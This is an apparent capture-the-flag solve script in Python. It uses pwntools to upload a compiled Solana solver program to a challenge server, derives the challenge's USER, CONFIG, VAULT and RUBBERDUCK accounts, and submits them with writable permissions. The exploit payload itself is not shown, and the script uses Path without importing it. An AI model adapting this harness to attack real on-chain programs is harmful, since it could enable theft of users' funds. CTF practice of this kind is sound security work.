from pwn import remote
from solders.pubkey import Pubkey
from solders.system_program import ID as SYSTEM_PROGRAM

HOST = "challs.scriptsorcerers.xyz"
PORT = 10225
SOLVE_PUBKEY = b"5PjDJaGfSPJj4tFzMRCiuuAasKg5n8dJKXKenhuwyexx"

solve = Path(__file__).with_name("solve.so").read_bytes()

print(f"[+] solve.so: {len(solve)} bytes")

r = remote(HOST, PORT)

r.recvuntil(b"program pubkey: ")
r.sendline(SOLVE_PUBKEY)

r.recvuntil(b"program len: ")
r.sendline(str(len(solve)).encode())
r.send(solve)

r.recvuntil(b"program: ")
program = Pubkey.from_string(r.recvline().strip().decode())

r.recvuntil(b"user: ")
user = Pubkey.from_string(r.recvline().strip().decode())

print(f"[+] program = {program}")
print(f"[+] user    = {user}")

user_config, _ = Pubkey.find_program_address(
    [bytes(user), b"USER"], program
)
config, _ = Pubkey.find_program_address(
    [b"CONFIG"], program
)
treasury, _ = Pubkey.find_program_address(
    [b"VAULT"], program
)
item0, _ = Pubkey.find_program_address(
    [b"RUBBERDUCK"], program
)

# sol-ctf-framework account permission syntax:
#   -r = read-only
#   -w = writable
#    sw = signer + writable
#
# These are the accounts the SOLVER program receives.
accounts = [
    ("-r", program),          # challenge program, executable/read-only
    ("sw", user),             # challenge user, signer + writable
    ("-w", user_config),      # user's USER PDA
    ("-w", config),           # CONFIG PDA
    ("-w", treasury),         # VAULT PDA
    ("-w", item0),            # RUBBERDUCK PDA
    ("-r", Pubkey.from_string(str(SYSTEM_PROGRAM))),  # system program
]

r.recvuntil(b"num accounts: ")
r.sendline(str(len(accounts)).encode())

for perms, pubkey in accounts:
    r.sendline(f"{perms} {pubkey}".encode())

r.recvuntil(b"ix len: ")
r.sendline(b"0")

print("[+] Solver instruction submitted")
print(r.recvall(timeout=10).decode(errors="replace"))

